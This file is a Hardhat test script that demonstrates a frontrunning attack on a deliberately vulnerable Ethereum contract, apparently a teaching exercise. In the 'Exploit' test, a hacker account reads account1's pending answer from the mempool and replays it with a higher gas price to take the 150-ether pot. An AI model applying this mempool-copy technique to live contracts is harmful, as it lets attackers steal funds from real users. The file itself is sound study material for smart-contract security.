const{expect} = require("chai");
const{expectRevert} = require("@openzeppelin/test-helpers");


describe("Frontrunning Attack", function(){

    let owner, account1, hacker,
        ToAttackFrontrunning, toAttackFrontrunning;


    before(async()=>{

        [owner, account1, hacker] = await ethers.getSigners();

        ToAttackFrontrunning = await ethers.getContractFactory("ToAttackFrontrunning");
        toAttackFrontrunning = await ToAttackFrontrunning.deploy({value:ethers.utils.parseEther("150")});
        await toAttackFrontrunning.deployed();


        let toAttackFrontrunningBalance = await ethers.provider.getBalance(toAttackFrontrunning.address);

        console.log("To Attack Frontrunning Balance", (toAttackFrontrunningBalance/10**18).toString(), "ether");
        console.log("");

        console.log(toAttackFrontrunning.address)
    });



    it("Exploit",async()=>{

        //Account 1 fund right answer and send to the contract to receive pot
        await toAttackFrontrunning.connect(account1).setResponse("Password");


        //Connecting to the mempool and obtain the pendingTx on the block
        const blockPending = await network.provider.send("eth_getBlockByNumber", [
            "pending",
            true,
        ]);


        //Filter Tx to check only the transaction to the contract
        let transaction = blockPending.transactions.find((tx) => tx.to.toLowerCase() == toAttackFrontrunning.address.toLowerCase())


        //Once find tx to the contract, we set the same tx but with a major gasPrice.
        //In this case hacker tx will be executed before the other one from the account 1
        await hacker.sendTransaction({
            to: transaction.to,
            data: transaction.input,
            gasPrice: ethers.BigNumber.from(transaction.gasPrice).add(1),
            gasLimit: transaction.gas
        });
    })



    after(async function (){
        await ethers.provider.send('evm_mine', []);


        let account1BalanceAfterAttack = await ethers.provider.getBalance(account1.address);

        console.log("Account1 Balance After Attack", (account1BalanceAfterAttack/10**18).toString(), "ether");
        console.log("");

        let hackerBalanceAfterAttack = await ethers.provider.getBalance(hacker.address);

        console.log("Hacker Balance After Attack", (hackerBalanceAfterAttack/10**18).toString(), "ether");
        console.log("");

    })
})